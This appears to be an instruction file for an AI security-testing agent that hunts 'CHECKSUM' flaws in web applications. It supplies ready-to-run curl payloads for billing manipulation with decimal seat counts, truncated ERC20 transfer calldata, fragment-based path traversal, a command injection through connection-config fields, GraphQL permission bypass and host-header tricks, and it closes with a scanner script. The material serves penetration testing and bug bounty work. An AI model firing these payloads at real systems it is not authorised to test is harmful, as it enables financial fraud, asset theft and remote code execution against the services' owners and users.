---
description: Find CHECKSUM vulnerabilities in web applications. Use when testing for CHECKSUM issues.
---

# CHECKSUM Vulnerability Testing Agent

## High-Value Attack Patterns

### Parameter Names
- `seats`, `amount`, `bid`, `lot`, `value`
- `sql_proxy_version`, `sql_proxy_binary_path`
- `targetSn`, `captain`, `tracer`
- `Extra` (JSON fields in configurations)

### Endpoint Patterns
- `/v2/seats` - billing manipulation
- `/api/mod/conversations` - moderation bypass
- `/files/api/v1.1/avatar/set` - avatar manipulation
- `/federation/graphql` - GraphQL mutations
- `/attachments` - file upload with UUID validation

### ID Types & Headers
- Decimal numbers in integer fields (1.9 instead of 2)
- UUID format validation bypass
- Fragment URLs with parameter injection (`#/path?param=`)
- Malformed transaction calldata lengths
- Case-insensitive path comparisons

## Discovery Commands

```bash
# Find potential billing/calculation endpoints
curl -s "$TARGET" | grep -E "(seat|billing|price|amount|checkout)" | grep -o 'href="[^"]*"' | cut -d'"' -f2

# Discover API endpoints with numeric parameters
curl -s "$TARGET/sitemap.xml" | grep -oE "https?://[^<]+" | grep -E "(v[0-9]+|api)" | head -20

# Find GraphQL endpoints
curl -s "$TARGET" | grep -i graphql | grep -oE "https?://[^\"']+" 

# Locate configuration/settings pages
curl -s "$TARGET" | grep -iE "(config|setting|admin)" | grep -o 'href="[^"]*"' | cut -d'"' -f2

# Find file upload endpoints
ffuf -u "$TARGET/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,201,400 -fw 1 | grep -E "(upload|file|attachment)"
```

## Step-by-Step Testing Methodology

### 1. Decimal Number Injection in Billing
```bash
# Test seat/billing manipulation
curl -X PUT "$TARGET/v2/seats" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"seats": 1.9}' \
  -v

# Verify response shows rounded seats but wrong pricing
curl -X GET "$TARGET/v2/billing" \
  -H "Authorization: Bearer $TOKEN" | jq '.seats, .amount'
```

### 2. Transaction Data Length Manipulation
```bash
# Normal ERC20 transfer data
NORMAL_DATA="0xa9059cbb000000000000000000000000C588e338FdBB2CC523a1177f3D18e87FF5A16a6b0000000000000000000000000000000000000000000000000000000000989700"

# Truncated data (remove last byte)
EVIL_DATA="0xa9059cbb000000000000000000000000C588e338FdBB2CC523a1177f3D18e87FF5A16a6b00000000000000000000000000000000000000000000000000000000009897"

curl -X POST "$TARGET/api/transaction" \
  -H "Content-Type: application/json" \
  -d "{\"data\":\"$EVIL_DATA\"}" \
  -v
```

### 3. UUID Validation Bypass
```bash
# Test with invalid UUID characters
INVALID_UUID="zzzzzzzz-zzzz-zzzz-zzzz-zzzzzzzzzzzz"

curl -X POST "$TARGET/attachments" \
  -F "file=@test.txt" \
  -F "tracer=$INVALID_UUID" \
  -H "Authorization: Bearer $TOKEN" \
  -v
```

### 4. URL Fragment Parameter Injection
```bash
# Test fragment parameter bypass
curl -X GET "$TARGET/safepath/file#../../admin/config?" \
  -H "User-Agent: Mozilla/5.0" \
  -v

# SMB access via FILE protocol (Windows)
curl "file://localhost/windows/win.ini#../../share/secrets?" -v
```

### 5. Configuration Parameter Injection
```bash
# Test SQL proxy version injection
curl -X POST "$TARGET/api/connections" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test_conn",
    "conn_type": "google_cloud_sql",
    "extra": {
      "sql_proxy_version": "../../../usr/bin/whoami?a=",
      "sql_proxy_binary_path": "id"
    }
  }' \
  -H "Authorization: Bearer $TOKEN" \
  -v
```

### 6. GraphQL Multiple Captain Bypass
```bash
# Test multiple captains in team
curl -X POST "$TARGET/federation/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "operationName": "CreateOrUpdateSo5LineupMutation",
    "variables": {
      "lineup": {
        "players": [
          {"id": "1", "captain": true},
          {"id": "2", "captain": true},
          {"id": "3", "captain": true}
        ]
      }
    }
  }' \
  -H "Authorization: Bearer $TOKEN" \
  -v
```

### 7. Header Trailing Whitespace
```bash
# Test trailing whitespace in headers
curl -X GET "$TARGET/api/restricted" \
  -H "Host: blocked-domain.com " \
  -H "X-Forwarded-Host: internal-service.local " \
  -v
```

## Severity Rating Table

| Vulnerability Type | Impact | Likelihood | Severity |
|-------------------|---------|------------|----------|
| Billing manipulation with decimals | High (Financial) | Medium | **High** |
| Token transfer without alerts | Critical (Asset theft) | Low | **High** |
| Command injection via config | Critical (RCE) | Low | **Critical** |
| UUID validation bypass | Low | High | **Low** |
| Fragment URL bypass | Medium | Medium | **Medium** |
| Multiple captains/permissions | Medium | High | **Medium** |
| Header whitespace bypass | Medium | Low | **Medium** |

## False Positives to Ignore

- UUID format warnings that don't affect functionality
- CSS injection in non-executable contexts
- Path traversal blocked by OS-level restrictions
- Decimal rounding in non-financial contexts
- Fragment URLs on static content
- Header whitespace in non-security contexts

## Finding Report Template

```markdown
# CHECKSUM Vulnerability: [Type]

## Summary
[Brief description of the issue and impact]

## Vulnerability Details
- **Endpoint**: [affected endpoint]
- **Parameter**: [vulnerable parameter]
- **Method**: [HTTP method]
- **Attack Vector**: [how the attack works]

## Proof of Concept
```bash
[curl command demonstrating the issue]
```

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Impact
- **Confidentiality**: [Low/Medium/High]
- **Integrity**: [Low/Medium/High]  
- **Availability**: [Low/Medium/High]
- **Business Impact**: [description]

## Evidence
[Response showing the vulnerability]

## Remediation
- Implement proper input validation for [parameter]
- Add bounds checking for numeric values
- Validate UUID format with strict regex
- Sanitize configuration parameters
- Implement proper access controls

## CVSS Score
[Calculate based on impact and exploitability]
```

## Quick Test Script

```bash
#!/bin/bash
TARGET="$1"
TOKEN="$2"

echo "=== CHECKSUM Vulnerability Scanner ==="
echo "Target: $TARGET"

# Test 1: Decimal injection
echo "[1] Testing decimal injection..."
curl -s -X PUT "$TARGET/v2/seats" -H "Content-Type: application/json" -d '{"seats":1.9}' | grep -q "seats" && echo "✓ Decimal endpoint found"

# Test 2: UUID bypass
echo "[2] Testing UUID validation..."
curl -s -X POST "$TARGET/attachments" -F "tracer=zzzz-zzzz-zzzz-zzzz-zzzzzzzzzzzz" -F "file=@/dev/null" | grep -q "200\|201" && echo "✓ UUID bypass possible"

# Test 3: Fragment injection
echo "[3] Testing fragment injection..."
curl -s "$TARGET/path#../admin?" | grep -q "admin\|config" && echo "✓ Fragment bypass found"

echo "=== Scan Complete ==="
```